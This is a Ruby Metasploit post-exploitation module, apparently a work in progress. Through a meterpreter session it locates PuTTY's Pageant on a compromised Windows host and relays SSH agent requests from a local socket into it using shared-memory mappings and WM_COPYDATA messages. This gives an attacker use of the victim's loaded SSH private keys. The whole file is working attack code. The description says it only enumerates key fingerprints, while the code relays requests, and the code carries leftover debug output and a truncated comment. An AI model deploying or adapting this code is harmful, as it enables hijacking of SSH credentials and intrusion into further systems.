##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'net/ssh'

class Metasploit3 < Msf::Post

  PAGEANT_SOMETHING_CONSTANT = 0x8dadad

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Windows Pageant Enumeration',
      'Description'   => %q{
        This module searches for instances of Pageant (part of PuTTy). If it finds
        Pageant running, it queries it in order to ascertain the number and fingerprints
        of any private keys that are loaded.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'Stuart Morgan' ],
      'Platform'      => [ 'win' ],
      'Arch'          => [ 'x86', 'x64' ],
      'SessionTypes'  => [ 'meterpreter' ],
    ))
  end

  # Main method
  def run
    # Need DL for the pointer arithmetic

    hwnd = client.railgun.user32.FindWindowW("Pageant", "Pageant")
    if hwnd['return'] == 0
        print_error "Pageant not found"
        return
    else
        print_status "Pageant is running (Handle: #{hwnd['return']})"
        UNIXServer.open("/tmp/sock") {|serv|
            s = serv.accept
            request = s.recvfrom(8192)
            response = pageant_query(hwnd['return'],request)
            if response
                vprint_status "Writing response"
                s.write response    
            end
        }
    end
  end

  def pageant_query(handle,buffer)
     k32 = client.railgun.kernel32
     ntdll = client.railgun.ntdll
     u32 = client.railgun.user32
     thread_id = k32.GetCurrentThreadId()
     retval = nil
     if thread_id['return'] == 0
         print_error "Unable to get current thread ID"
         return
     else
         vprint_status "Current thread ID is: #{thread_id['return']}"
         request_string = sprintf("PageantRequest%08x\x00", thread_id['return'])
         vprint_status "Current request string is: #{request_string}"
         security_attributes = nil
         cfm = k32.CreateFileMappingA(
            -1, #Handle = INVALID_HANDLE_VALUE,
            security_attributes, 
            0x04, # PAGE_REWRITE,
            nil, # Size (high)
            8192, # Size (low)
            request_string) # The pageant request string
         if cfm['GetLastError']==0 and cfm['return'] != 0 
            vprint_status "File mapping handle is #{cfm['return']}"
            mvof = k32.MapViewOfFile(
                cfm['return'], 
                2, #FILE_MAP_WRITE
                0, 
                0, 
                0)
            if mvof['GetLastError']==0 and mvof['return'] != 0 
                vprint_status "MapViewOfFile result is #{mvof['return']}"
                client.railgun.memwrite(mvof['return'],buffer, buffer.size + 1)
		        cds = [0x804e50ba, buffer.size + 1, request_string].pack("LLp")
                #cdsmem = k32.VirtualAlloc(nil,8192,0x00001000|0x00002000,0x04)
                cdsmem = k32.VirtualAlloc(nil,14000,'MEM_COMMIT|MEM_RESERVE', 'PAGE_EXECUTE_READWRITE')
                vprint_status cdsmem.inspect
                vprint_status "Allocated memory for buffer is #{cdsmem['return']}"
                client.railgun.memwrite(cdsmem['return'],cds,cds.size)
                puts "write"
                succ = u32.SendMessageA(handle, 74, 0, cdsmem['return'])
                if succ['return']>0
                    vprint_status "Successful reply (SendMessage return: #{succ['return']})"
                    retval = client.railgun.memread(cdsmem['return'],8192)    
                end
                #k32.UnmapViewOfFile(mvof['return'])
                #k32.CloseHandle(cdsmem['return'])
            else
                print_error "MapViewOfFile call failed"
            end
            k32.CloseHandle(cfm['return'])
         else
            print_error "CreateFileMapping call failed"
         end
     # Pageant is a strange 
     #client.railgun.user32.SendMessageW(hwnd['return'], 0x00F1, 1, nil)
     end
     return retval
  end

end
